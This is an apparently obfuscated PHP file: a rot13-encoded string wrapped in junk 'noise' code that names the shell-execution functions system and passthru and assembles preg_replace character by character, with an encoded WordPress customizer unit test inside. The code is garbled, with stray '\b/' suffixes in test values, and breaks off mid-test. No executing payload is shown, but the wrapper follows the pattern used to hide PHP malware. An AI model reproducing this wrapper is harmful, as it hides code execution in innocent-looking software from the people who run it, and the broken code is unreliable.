<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc

/**
 * Grfgf sbe gur JC_Phfgbzvmr_Frggvat pynff.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfgf_JC_Phfgbzvmr_Frggvat rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	cebgrpgrq $znantre;

	/**
	 * @ine fgqPynff na vafgnapr juvpu freirf nf n flzoby gb qb vqragvgl purpxf jvgu
	 */
	choyvp $haqrsvarq;

	/**
	 * Funerq nqzva hfre VQ sbe gur grfgf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzva_vq = 0;

	/**
	 * Frg hc funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		$TYBONYF['jc_phfgbzvmr'] = arj JC_Phfgbzvmr_Znantre();
		$guvf->znantre           = $TYBONYF['jc_phfgbzvmr'];
		$guvf->haqrsvarq         = arj fgqPynff();
	}

	choyvp shapgvba grne_qbja() {
		$guvf->znantre = ahyy;
		hafrg( $TYBONYF['jc_phfgbzvmr'] );
		cnerag::grne_qbja();
	}

	choyvp shapgvba grfg_pbafgehpgbe_jvgubhg_netf() {
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, 'sbb' );
		$guvf->nffregFnzr( $guvf->znantre, $frggvat->znantre );
		$guvf->nffregFnzr( 'sbb', $frggvat->vq );
		$guvf->nffregFnzr( 'gurzr_zbq', $frggvat->glcr );
		$guvf->nffregFnzr( 'rqvg_gurzr_bcgvbaf', $frggvat->pncnovyvgl );
		$guvf->nffregFnzr( '', $frggvat->gurzr_fhccbegf );
		$guvf->nffregFnzr( '', $frggvat->qrsnhyg );
		$guvf->nffregFnzr( 'erserfu', $frggvat->genafcbeg );
		$guvf->nffregFnzr( '', $frggvat->fnavgvmr_pnyyonpx );
		$guvf->nffregFnzr( '', $frggvat->fnavgvmr_wf_pnyyonpx );
		$guvf->nffregSnyfr( unf_svygre( \"phfgbzvmr_inyvqngr_{$frggvat->vq}\" ) );
		$guvf->nffregSnyfr( unf_svygre( \"phfgbzvmr_fnavgvmr_{$frggvat->vq}\" ) );
		$guvf->nffregSnyfr( unf_svygre( \"phfgbzvmr_fnavgvmr_wf_{$frggvat->vq}\" ) );
		$guvf->nffregSnyfr( $frggvat->qvegl );
	}

	/**
	 * N grfg inyvqngr pnyyonpx shapgvba.
	 *
	 * @cnenz zvkrq                $inyhr   Gur frggvat inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Gur frggvat bowrpg.
	 */
	choyvp shapgvba inyvqngr_pnyyonpx_sbe_grfgf( $inyhr, $frggvat ) {
		erghea $inyhr . ':inyvqngr_pnyyonpx';
	}

	/**
	 * N grfg fnavgvmr pnyyonpx shapgvba.
	 *
	 * @cnenz zvkrq                $inyhr   Gur frggvat inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Gur frggvat bowrpg.
	 */
	choyvp shapgvba fnavgvmr_pnyyonpx_sbe_grfgf( $inyhr, $frggvat ) {
		erghea $inyhr . ':fnavgvmr_pnyyonpx';
	}

	/**
	 * N grfg fnavgvmr WF pnyyonpx shapgvba.
	 *
	 * @cnenz zvkrq                $inyhr   Gur frggvat inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Gur frggvat bowrpg.
	 */
	choyvp shapgvba fnavgvmr_wf_pnyyonpx_sbe_grfgf( $inyhr, $frggvat ) {
		erghea $inyhr . ':fnavgvmr_wf_pnyyonpx';
	}

	/**
	 * Fnavgvmr WF pnyyonpx sbe onfr64 rapbqvat.
	 *
	 * @cnenz zvkrq                $inyhr   Gur frggvat inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Gur frggvat bowrpg.
	 */
	choyvp shapgvba fnavgvmr_wf_pnyyonpx_onfr64_sbe_grfgvat( $inyhr, $frggvat ) {
		erghea onfr64_rapbqr( $inyhr );
	}

	choyvp shapgvba grfg_pbafgehpgbe_jvgu_netf() {
		$netf    = neenl(
			'glcr'                 => 'bcgvba',
			'pncnovyvgl'           => 'rqvg_cbfgf',
			'gurzr_fhccbegf'       => 'jvqtrgf',
			'qrsnhyg'              => 'oneone',
			'genafcbeg'            => 'cbfgZrffntr',
			'inyvqngr_pnyyonpx'    => neenl( $guvf, 'inyvqngr_pnyyonpx_sbe_grfgf' ),
			'fnavgvmr_pnyyonpx'    => neenl( $guvf, 'fnavgvmr_pnyyonpx_sbe_grfgf' ),
			'fnavgvmr_wf_pnyyonpx' => neenl( $guvf, 'fnavgvmr_wf_pnyyonpx_sbe_grfgf' ),
		);
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, 'one', $netf );
		$guvf->nffregFnzr( 'one', $frggvat->vq );
		sbernpu ( $netf nf $xrl => $inyhr ) {
			$guvf->nffregFnzr( $inyhr, $frggvat->$xrl );
		}
		$guvf->nffregFnzr( 10, unf_svygre( \"phfgbzvmr_inyvqngr_{$frggvat->vq}\", $netf['inyvqngr_pnyyonpx'] ) );
		$guvf->nffregFnzr( 10, unf_svygre( \"phfgbzvmr_fnavgvmr_{$frggvat->vq}\", $netf['fnavgvmr_pnyyonpx'] ) );
		$guvf->nffregFnzr( 10, unf_svygre( \"phfgbzvmr_fnavgvmr_wf_{$frggvat->vq}\", $netf['fnavgvmr_wf_pnyyonpx'] ) );
	}

	choyvp $cbfg_qngn_bireevqrf = neenl(
		'hafrg_bcgvba_bireevqqra'               => 'hafrg_bcgvba_cbfg_bireevqr_inyhr\\b/',
		'hafrg_gurzr_zbq_bireevqqra'            => 'hafrg_gurzr_zbq_cbfg_bireevqr_inyhr\\b/',
		'frg_bcgvba_bireevqqra'                 => 'frg_bcgvba_cbfg_bireevqr_inyhr\\b/',
		'frg_gurzr_zbq_bireevqqra'              => 'frg_gurzr_zbq_cbfg_bireevqr_inyhr\\b/',
		'hafrg_bcgvba_zhygv_bireevqqra[sbb]'    => 'hafrg_bcgvba_zhygv_bireevqqra[sbb]_cbfg_bireevqr_inyhr\\b/',
		'hafrg_gurzr_zbq_zhygv_bireevqqra[sbb]' => 'hafrg_gurzr_zbq_zhygv_bireevqqra[sbb]_cbfg_bireevqr_inyhr\\b/',
		'frg_bcgvba_zhygv_bireevqqra[sbb]'      => 'frg_bcgvba_zhygv_bireevqqra[sbb]_cbfg_bireevqr_inyhr\\b/',
		'frg_gurzr_zbq_zhygv_bireevqqra[sbb]'   => 'frg_gurzr_zbq_zhygv_bireevqqra[sbb]_cbfg_bireevqr_inyhr\\b/',
	);

	choyvp $fgnaqneq_glcr_pbasvtf = neenl(
		'bcgvba'    => neenl(
			'trggre' => 'trg_bcgvba',
			'frggre' => 'hcqngr_bcgvba',
		),
		'gurzr_zbq' => neenl(
			'trggre' => 'trg_gurzr_zbq',
			'frggre' => 'frg_gurzr_zbq',
		),
	);

	/**
	 * Eha nffregvbaf ba aba-zhygvqvzrafvbany fgnaqneq frggvatf.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_cerivrj_fgnaqneq_glcrf_aba_zhygvqvzrafvbany() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $guvf->cbfg_qngn_bireevqrf ) );

		// Gel aba-zhygvqvzrafvbany frggvatf.
		sbernpu ( $guvf->fgnaqneq_glcr_pbasvtf nf $glcr => $glcr_bcgvbaf ) {
			// Aba-zhygvqvzrafvbany: Frr jung rssrpg gur cerivrj svygre unf ba n aba-rkvfgrag frggvat (qrsnhyg inyhr fubhyq or frra).
			$anzr    = \"hafrg_{$glcr}_jvgubhg_cbfg_inyhr\";
			$qrsnhyg = \"qrsnhyg_inyhr_{$anzr}\";
			$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$guvf->nffregFnzr( $guvf->haqrsvarq, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
			$guvf->nffregGehr( $frggvat->cerivrj(), 'Cerivrj fubhyq abg ab-bc fvapr frggvat unf ab rkvfgvat inyhr.' );
			$guvf->nffregFnzr( $qrsnhyg, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr, $guvf->haqrsvarq ), fcevags( 'Rkcrpgrq %f(%f) gb erghea frggvat qrsnhyg: %f.', $glcr_bcgvbaf['trggre'], $anzr, $qrsnhyg ) );
			$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );

			// Aba-zhygvqvzrafvbany: Frr jung rssrpg gur cerivrj unf ba na rkgnag frggvat (qrsnhyg inyhr fubhyq abg or frra).
			$anzr          = \"frg_{$glcr}_jvgubhg_cbfg_inyhr\";
			$qrsnhyg       = \"qrsnhyg_inyhr_{$anzr}\";
			$vavgvny_inyhr = \"vavgvny_inyhr_{$anzr}\";
			pnyy_hfre_shap( $glcr_bcgvbaf['frggre'], $anzr, $vavgvny_inyhr );
			$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$guvf->nffregFnzr( $vavgvny_inyhr, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr ) );
			$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );
			$guvf->nffregSnyfr( $frggvat->cerivrj(), 'Cerivrj fubhyq ab-bc fvapr frggvat inyhr jnf rkgnag naq ab cbfg inyhr jnf cerfrag.' );
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( $vavgvny_inyhr, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr ) );
			$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );

			// Aba-zhygvqvzrafvbany: Gel hcqngvat n inyhr gung unq n ab-bc cerivrj.
			$bireevqqra_inyhr = \"bireevqqra_inyhr_$anzr\";
			pnyy_hfre_shap( $glcr_bcgvbaf['frggre'], $anzr, $bireevqqra_inyhr );
			$zrffntr = 'Vavgvny inyhr fubhyq or bireevqqra orpnhfr vavgvny cerivrj() jnf ab-bc qhr gb frggvat univat rkvfgvat inyhr naq/be cbfg inyhr jnf nofrag.';
			$guvf->nffregFnzr( $bireevqqra_inyhr, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr ), $zrffntr );
			$guvf->nffregFnzr( $bireevqqra_inyhr, $frggvat->inyhr(), $zrffntr );
			$guvf->nffregAbgRdhnyf( $vavgvny_inyhr, $frggvat->inyhr(), $zrffntr );

			// Aba-zhygvqvzrafvbany: Rafher gung frggvat n cbfg inyhr *nsgre* cerivrj() vf pnyyrq erfhygf va gur cbfg inyhr orvat frra (qrsreerq cerivrj).
			$cbfg_inyhr = \"cbfg_inyhr_sbe_{$frggvat->vq}_frg_nsgre_cerivrj_pnyyrq\";
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cbfg_inyhr_frg_{$frggvat->vq}\" ) );
			$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $cbfg_inyhr );
			$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_cbfg_inyhr_frg_{$frggvat->vq}\" ) );
			$guvf->nffregAbgRdhnyf( $bireevqqra_inyhr, $frggvat->inyhr() );
			$guvf->nffregFnzr( $cbfg_inyhr, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr ) );
			$guvf->nffregFnzr( $cbfg_inyhr, $frggvat->inyhr() );

			// Aba-zhygvqvzrafvbany: Grfg hafrg frggvat orvat bireevqqra ol n cbfg inyhr.
			$anzr    = \"hafrg_{$glcr}_bireevqqra\";
			$qrsnhyg = \"qrsnhyg_inyhr_{$anzr}\";
			$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$guvf->nffregFnzr( $guvf->haqrsvarq, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
			$guvf->nffregGehr( $frggvat->cerivrj(), 'Cerivrj nccyvrf orpnhfr frggvat unf cbfg_qngn_bireevqrf.' ); // Npgvingr cbfg_qngn.
			$guvf->nffregFnzr( $guvf->cbfg_qngn_bireevqrf[ $anzr ], pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $guvf->cbfg_qngn_bireevqrf[ $anzr ], $frggvat->inyhr() );

			// Aba-zhygvqvzrafvbany: Grfg frg frggvat orvat bireevqqra ol n cbfg inyhr.
			$anzr          = \"frg_{$glcr}_bireevqqra\";
			$qrsnhyg       = \"qrsnhyg_inyhr_{$anzr}\";
			$vavgvny_inyhr = \"vavgvny_inyhr_{$anzr}\";
			pnyy_hfre_shap( $glcr_bcgvbaf['frggre'], $anzr, $vavgvny_inyhr );
			$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$guvf->nffregFnzr( $vavgvny_inyhr, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );
			$guvf->nffregGehr( $frggvat->cerivrj(), 'Cerivrj nccyvrf orpnhfr frggvat unf cbfg_qngn_bireevqrf.' ); // Npgvingr cbfg_qngn.
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( $guvf->cbfg_qngn_bireevqrf[ $anzr ], pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $guvf->cbfg_qngn_bireevqrf[ $anzr ], $frggvat->inyhr() );
		}
	}

	/**
	 * Eha nffregvbaf ba zhygvqvzrafvbany fgnaqneq frggvatf.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::cerivrj()
	 * @frr JC_Phfgbzvmr_Frggvat::inyhr()
	 */
	choyvp shapgvba grfg_cerivrj_fgnaqneq_glcrf_zhygvqvzrafvbany() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $guvf->cbfg_qngn_bireevqrf ) );

		sbernpu ( $guvf->fgnaqneq_glcr_pbasvtf nf $glcr => $glcr_bcgvbaf ) {
			// Zhygvqvzrafvbany: Frr jung rssrpg gur cerivrj svygre unf ba n aba-rkvfgrag frggvat (qrsnhyg inyhr fubhyq or frra).
			$onfr_anzr = \"hafrg_{$glcr}_zhygv\";
			$anzr      = $onfr_anzr . '[sbb]';
			$qrsnhyg   = \"qrsnhyg_inyhr_{$anzr}\";
			$frggvat   = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$guvf->nffregFnzr( $guvf->haqrsvarq, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
			$guvf->nffregGehr( $frggvat->cerivrj(), \"Cerivrj sbe $frggvat->vq fubhyq nccyl orpnhfr frggvat vf abg va QO.\" );
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq );
			$guvf->nffregNeenlUnfXrl( 'sbb', $onfr_inyhr );
			$guvf->nffregFnzr( $qrsnhyg, $onfr_inyhr['sbb'] );

			// Zhygvqvzrafvbany: Frr jung rssrpg gur cerivrj unf ba na rkgnag frggvat (qrsnhyg inyhr fubhyq abg or frra) jvgubhg cbfg inyhr.
			$onfr_anzr          = \"frg_{$glcr}_zhygv\";
			$anzr               = $onfr_anzr . '[sbb]';
			$qrsnhyg            = \"qrsnhyg_inyhr_{$anzr}\";
			$vavgvny_inyhr      = \"vavgvny_inyhr_{$anzr}\";
			$onfr_vavgvny_inyhr = neenl(
				'sbb' => $vavgvny_inyhr,
				'one' => 'crefvfgrq',
			);
			pnyy_hfre_shap( $glcr_bcgvbaf['frggre'], $onfr_anzr, $onfr_vavgvny_inyhr );
			$frggvat    = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, neenl() );
			$guvf->nffregFnzr( $vavgvny_inyhr, $onfr_inyhr['sbb'] );
			$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );
			$guvf->nffregSnyfr( $frggvat->cerivrj(), \"Cerivrj sbe $frggvat->vq fubhyq ab-bc orpnhfr frggvat vf va QO naq cbfg inyhr vf nofrag.\" );
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, neenl() );
			$guvf->nffregFnzr( $vavgvny_inyhr, $onfr_inyhr['sbb'] );
			$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );

			// Zhygvqvzrafvbany: Rafher gung frggvat n cbfg inyhr *nsgre* cerivrj() vf pnyyrq erfhygf va gur cbfg inyhr orvat frra (qrsreerq cerivrj).
			$bireevqr_inyhr = \"cbfg_inyhr_sbe_{$frggvat->vq}_frg_nsgre_cerivrj_pnyyrq\";
			$guvf->znantre->frg_cbfg_inyhr( $frggvat->vq, $bireevqr_inyhr );
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, neenl() );
			$guvf->nffregFnzr( $bireevqr_inyhr, $onfr_inyhr['sbb'] );
			$guvf->nffregFnzr( $bireevqr_inyhr, $frggvat->inyhr() );

			// Zhygvqvzrafvbany: Grfg hafrg frggvat orvat bireevqqra ol n cbfg inyhr.
			$onfr_anzr = \"hafrg_{$glcr}_zhygv_bireevqqra\";
			$anzr      = $onfr_anzr . '[sbb]';
			$qrsnhyg   = \"qrsnhyg_inyhr_{$anzr}\";
			$frggvat   = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$guvf->nffregFnzr( $guvf->haqrsvarq, pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq ) );
			$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
			$guvf->nffregGehr( $frggvat->cerivrj(), \"Cerivrj sbe $frggvat->vq fubhyq nccyl orpnhfr n cbfg inyhr vf cerfrag.\" );
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq );
			$guvf->nffregNeenlUnfXrl( 'sbb', $onfr_inyhr );
			$guvf->nffregFnzr( $guvf->cbfg_qngn_bireevqrf[ $anzr ], $onfr_inyhr['sbb'] );

			// Zhygvqvzrafvbany: Grfg frg frggvat orvat bireevqqra ol n cbfg inyhr.
			$onfr_anzr          = \"frg_{$glcr}_zhygv_bireevqqra\";
			$anzr               = $onfr_anzr . '[sbb]';
			$qrsnhyg            = \"qrsnhyg_inyhr_{$anzr}\";
			$vavgvny_inyhr      = \"vavgvny_inyhr_{$anzr}\";
			$onfr_vavgvny_inyhr = neenl(
				'sbb' => $vavgvny_inyhr,
				'one' => 'crefvfgrq',
			);
			pnyy_hfre_shap( $glcr_bcgvbaf['frggre'], $onfr_anzr, $onfr_vavgvny_inyhr );
			$frggvat    = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq );
			$guvf->nffregNeenlUnfXrl( 'sbb', $onfr_inyhr );
			$guvf->nffregNeenlUnfXrl( 'one', $onfr_inyhr );
			$guvf->nffregFnzr( $onfr_vavgvny_inyhr['sbb'], $onfr_inyhr['sbb'] );

			$trggre = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq );
			$guvf->nffregFnzr( $onfr_vavgvny_inyhr['one'], $trggre['one'] );
			$guvf->nffregFnzr( $vavgvny_inyhr, $frggvat->inyhr() );
			$guvf->nffregGehr( $frggvat->cerivrj(), \"Cerivrj sbe $frggvat->vq fubhyq nccyl orpnhfr cbfg inyhr vf cerfrag.\" );
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$guvf->nffregFnzr( 0, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) ); // Bayl nccyvpnoyr sbe phfgbz glcrf (abg bcgvbaf be gurzr_zbqf).
			$onfr_inyhr = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq );
			$guvf->nffregNeenlUnfXrl( 'sbb', $onfr_inyhr );
			$guvf->nffregFnzr( $guvf->cbfg_qngn_bireevqrf[ $anzr ], $onfr_inyhr['sbb'] );
			$guvf->nffregNeenlUnfXrl( 'one', pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq ) );

			$trggre = pnyy_hfre_shap( $glcr_bcgvbaf['trggre'], $onfr_anzr, $guvf->haqrsvarq );
			$guvf->nffregFnzr( $onfr_vavgvny_inyhr['one'], $trggre['one'] );
		}
	}

	/**
	 * @ine neenl fgbentr sbe fnirq phfgbz glcr qngn gung ner grfgrq va frys::grfg_cerivrj_phfgbz_glcr()
	 */
	cebgrpgrq $phfgbz_glcr_qngn_fnirq;

	/**
	 * @ine neenl fgbentr sbe cerivrjrq phfgbz glcr qngn gung ner grfgrq va frys::grfg_cerivrj_phfgbz_glcr()
	 */
	cebgrpgrq $phfgbz_glcr_qngn_cerivrjrq;

	cevingr shapgvba phfgbz_glcr_trggre( $anzr, $qrsnhyg_inyhr = ahyy ) {
		vs ( qvq_npgvba( \"phfgbzvmr_cerivrj_{$anzr}\" ) && neenl_xrl_rkvfgf( $anzr, $guvf->phfgbz_glcr_qngn_cerivrjrq ) ) {
			$inyhr = $guvf->phfgbz_glcr_qngn_cerivrjrq[ $anzr ];
		} ryfrvs ( neenl_xrl_rkvfgf( $anzr, $guvf->phfgbz_glcr_qngn_fnirq ) ) {
			$inyhr = $guvf->phfgbz_glcr_qngn_fnirq[ $anzr ];
		} ryfr {
			$inyhr = $qrsnhyg_inyhr;
		}
		erghea $inyhr;
	}

	cevingr shapgvba phfgbz_glcr_frggre( $anzr, $inyhr ) {
		$guvf->phfgbz_glcr_qngn_fnirq[ $anzr ] = $inyhr;
	}

	/**
	 * Svygre sbe `phfgbzvmr_inyhr_{$vq_onfr}`.
	 *
	 * @cnenz zvkrq $qrsnhyg_inyhr
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat
	 *
	 * @erghea zvkrq|ahyy
	 */
	choyvp shapgvba phfgbz_glcr_inyhr_svygre( $qrsnhyg_inyhr, $frggvat = ahyy ) {
		$anzr = __sa_79955( '/^phfgbzvmr_inyhr_/', '', pheerag_svygre() );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Frggvat', $frggvat );
		$vq_qngn = $frggvat->vq_qngn();
		$guvf->nffregFnzr( $anzr, $vq_qngn['onfr'] );
		erghea $guvf->phfgbz_glcr_trggre( $anzr, $qrsnhyg_inyhr );
	}

	/**
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat
	 */
	choyvp shapgvba phfgbz_glcr_cerivrj( $frggvat ) {
		$cerivrjrq_inyhr = $frggvat->cbfg_inyhr( $guvf->haqrsvarq );
		vs ( $guvf->haqrsvarq !== $cerivrjrq_inyhr ) {
			$guvf->phfgbz_glcr_qngn_cerivrjrq[ $frggvat->vq ] = $cerivrjrq_inyhr;
		}
	}
	/**
	 * Eha nffregvbaf ba phfgbz frggvatf.
	 *
	 * @frr JC_Phfgbzvmr_Frggvat::cerivrj()
	 */
	choyvp shapgvba grfg_cerivrj_phfgbz_glcr() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$glcr                = 'phfgbz_glcr';
		$cbfg_qngn_bireevqrf = neenl(
			\"hafrg_{$glcr}_jvgu_cbfg_inyhr\" => \"hafrg_{$glcr}_jvgubhg_cbfg_inyhr\\b/\",
			\"frg_{$glcr}_jvgu_cbfg_inyhr\"   => \"frg_{$glcr}_jvgubhg_cbfg_inyhr\\b/\",
		);
		$_CBFG['phfgbzvmrq'] = jc_fynfu( jc_wfba_rapbqr( $cbfg_qngn_bireevqrf ) );

		$guvf->phfgbz_glcr_qngn_fnirq     = neenl();
		$guvf->phfgbz_glcr_qngn_cerivrjrq = neenl();

		nqq_npgvba( \"phfgbzvmr_cerivrj_{$glcr}\", neenl( $guvf, 'phfgbz_glcr_cerivrj' ) );

		// Phfgbz glcr abg rkvfgvat naq ab cbfg inyhr bireevqr.
		$anzr    = \"hafrg_{$glcr}_jvgubhg_cbfg_inyhr\";
		$qrsnhyg = \"qrsnhyg_inyhr_{$anzr}\";
		$frggvat = arj JC_Phfgbzvmr_Frggvat( $guvf->znantre, $anzr, pbzcnpg( 'glcr', 'qrsnhyg' ) );
		// Abgr: #29316 jvyy nyybj hf gb unir bar svygre sbe nyy frggvatf bs n tvira glcr, juvpu vf jung jr arrq.
		nqq_svygre( \"phfgbzvmr_inyhr_{$anzr}\", neenl( $guvf, 'phfgbz_glcr_inyhr_svygre' ), 10, 2 );
		$guvf->nffregFnzr( $guvf->haqrsvarq, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) );
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() );
		$guvf->nffregGehr( $frggvat->cerivrj() );
		$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->vq}\" ) );
		$guvf->nffregFnzr( 1, qvq_npgvba( \"phfgbzvmr_cerivrj_{$frggvat->glcr}\" ) );
		$guvf->nffregFnzr( $guvf->haqrsvarq, $guvf->phfgbz_glcr_trggre( $anzr, $guvf->haqrsvarq ) ); // Abgr: sbe n aba-phfgbz glcr guvf vf $qrsnhyg.
		$guvf->nffregFnzr( $qrsnhyg, $frggvat->inyhr() ); // Fubhyq or fnzr nf nobir.

		// Phfgbz glcr rkvfgvat naq ab cbfg inyhr bireevqr.
		$anzr          = \"frg_{$glcr}_jvgubhg_cbfg_inyhr\";
		$qrsnhyg       = \"qrsnhyg_inyhr_{$anzr}\";
		$vavgvny_inyhr = \"vavgvny_inyhr_{$anzr}\";
		$guvf->phfgbz_glcr_frggre( $anzr, $vavgvny_inyhr );
